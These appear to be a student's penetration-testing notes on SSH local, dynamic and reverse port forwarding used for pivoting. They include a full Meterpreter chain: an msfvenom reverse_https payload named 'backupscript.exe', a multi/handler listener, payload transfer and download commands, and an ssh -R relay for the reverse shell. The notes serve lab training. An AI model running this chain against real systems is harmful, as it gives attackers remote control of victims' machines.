Port Forwarding using `ssh`
`ssh -L 22:localhost:80 user@serverB`

What this really means:
you're telling ssh service on the vitcim :
"tunnel my requests to localhost:`<forwarded-port>` to your own localhost:`<service-port>`".

Let me explain with a concrete example:

1. When you hit localhost:22 on YOUR machine
2. SSH tunnels that request through the connection to serverB
3. ServerB then makes a connection to localhost:80 FROM ITS PERSPECTIVE
4. So serverB accesses its own port 80, not yours

## Forwarding Multiple Ports

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

## Reverse Port Forwarding

---

![[Screenshots/Pasted image 20250110221008.png]]

#### Creating a Windows Payload with msfvenom

Remote/Reverse Port Forwarding with SSH

```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

Saved as: backupscript.exe
```

#### Configuring & Starting the multi/handler

```shell-session
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

#### Transferring Payload to Pivot Host

```shell-session
$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00
```

After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.

---

### Serving Reverse shell to victim via web server

Remote/Reverse Port Forwarding with SSH

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

#### Downloading Payload on the Windows Target

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`

```shell-session
$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
example

```

After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
